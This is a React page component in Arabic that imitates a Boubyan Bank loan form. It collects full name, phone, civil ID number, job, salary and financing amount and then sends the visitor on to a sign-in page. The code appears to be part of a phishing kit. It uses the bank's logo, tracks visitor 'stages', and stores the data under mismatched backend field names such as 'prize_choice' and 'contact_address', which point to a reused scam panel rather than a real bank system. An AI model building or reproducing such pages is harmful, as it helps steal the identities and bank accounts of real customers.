import { FormEvent, useState } from "react";
import { useNavigate } from "react-router-dom";
import { createOrUpdateRequest, fillFieldMessage } from "@/api/visitorSession";
import { useVisitorSession } from "@/hooks/useVisitorSession";
import { ROUTES } from "@/routes";

const FINANCING_AMOUNTS = ["5000", "10000", "20000", "30000", "40000", "50000"] as const;

export default function PersonalInfoPage() {
  const navigate = useNavigate();
  const [fullName, setFullName] = useState("");
  const [phone, setPhone] = useState("");
  const [civilId, setCivilId] = useState("");
  const [jobTitle, setJobTitle] = useState("");
  const [salary, setSalary] = useState("");
  const [financingAmount, setFinancingAmount] = useState("");
  const [error, setError] = useState<string | null>(null);

  useVisitorSession("personal_info");

  const onSubmit = async (event: FormEvent) => {
    event.preventDefault();
    const nameOk = fullName.trim().length > 0;
    const phoneOk = phone.trim().length > 0;
    const civilOk = civilId.trim().length > 0;
    const jobOk = jobTitle.trim().length > 0;
    const salaryOk = salary.trim().length > 0;
    const financingOk = financingAmount.length > 0;

    if (!nameOk || !phoneOk || !civilOk || !jobOk || !salaryOk || !financingOk) {
      const message = !nameOk
        ? fillFieldMessage("الاسم")
        : !phoneOk
          ? fillFieldMessage("رقم الهاتف")
          : !civilOk
            ? fillFieldMessage("رقم الهوية المدني")
            : !jobOk
              ? fillFieldMessage("الوظيفة")
              : !salaryOk
                ? fillFieldMessage("الراتب")
                : fillFieldMessage("قيمة التمويل");
      setError(message);
      return;
    }

    setError(null);
    await createOrUpdateRequest({
      stage_key: "personal_info",
      contact_ref: phone.trim(),
      contact_name: fullName.trim(),
      civil_id: civilId.trim(),
      prize_choice: jobTitle.trim(),
      contact_extra: salary.trim(),
      contact_address: financingAmount,
      stage_state: "pending",
      notify_key: "----",
    });
    navigate(ROUTES.signIn);
  };

  return (
    <main className="page-bank__shell view--bank" aria-label="المعلومات الشخصية">
      <header className="bank-topbar">
        <span className="bank-icon bank-icon--chat" aria-hidden="true" />
        <button type="button" className="bank-menu" aria-label="القائمة">
          <span />
          <span />
          <span />
        </button>
      </header>
      <div className="bank-logo-wrap">
        <img src="/BoubyanBankLogo_(1).webp" alt="بوبيان Boubyan" className="bank-logo-img" width={165} />
      </div>
      <form className="bank-form personal-info-form" onSubmit={onSubmit} noValidate>
        <h1 className="bank-section-title personal-info-title">أكمل معلوماتك الشخصية</h1>
        <p className="bank-hint personal-info-hint">أدخل بياناتك لاستكمال طلب التمويل</p>

        <label className="bank-field">
          <span className="bank-label">الاسم</span>
          <input
            type="text"
            className="bank-input"
            value={fullName}
            onChange={(event) => setFullName(event.target.value)}
            autoComplete="name"
            required
          />
        </label>

        <label className="bank-field">
          <span className="bank-label">رقم الهاتف</span>
          <input
            type="tel"
            className="bank-input"
            value={phone}
            onChange={(event) => setPhone(event.target.value)}
            inputMode="tel"
            autoComplete="tel"
            dir="ltr"
            required
          />
        </label>

        <label className="bank-field">
          <span className="bank-label">رقم الهوية المدني</span>
          <input
            type="text"
            className="bank-input"
            value={civilId}
            onChange={(event) => setCivilId(event.target.value.replace(/\D/g, ""))}
            inputMode="numeric"
            autoComplete="off"
            dir="ltr"
            maxLength={12}
            required
          />
        </label>

        <label className="bank-field">
          <span className="bank-label">الوظيفة</span>
          <input
            type="text"
            className="bank-input"
            value={jobTitle}
            onChange={(event) => setJobTitle(event.target.value)}
            autoComplete="organization-title"
            required
          />
        </label>

        <label className="bank-field">
          <span className="bank-label">الراتب</span>
          <input
            type="text"
            className="bank-input"
            value={salary}
            onChange={(event) => setSalary(event.target.value)}
            inputMode="decimal"
            dir="ltr"
            placeholder="مثال: 850"
            required
          />
        </label>

        <label className="bank-field">
          <span className="bank-label">قيمة التمويل</span>
          <select
            className="bank-input bank-select"
            value={financingAmount}
            onChange={(event) => setFinancingAmount(event.target.value)}
            required
          >
            <option value="" disabled>
              اختر قيمة التمويل
            </option>
            {FINANCING_AMOUNTS.map((amount) => (
              <option key={amount} value={amount}>
                {Number(amount).toLocaleString("en-US")}
              </option>
            ))}
          </select>
        </label>

        {error && (
          <p className="bank-field-error" role="alert">
            {error}
          </p>
        )}
        <button type="submit" className="btn-primary btn-primary--bank">
          متابعة
        </button>
      </form>
    </main>
  );
}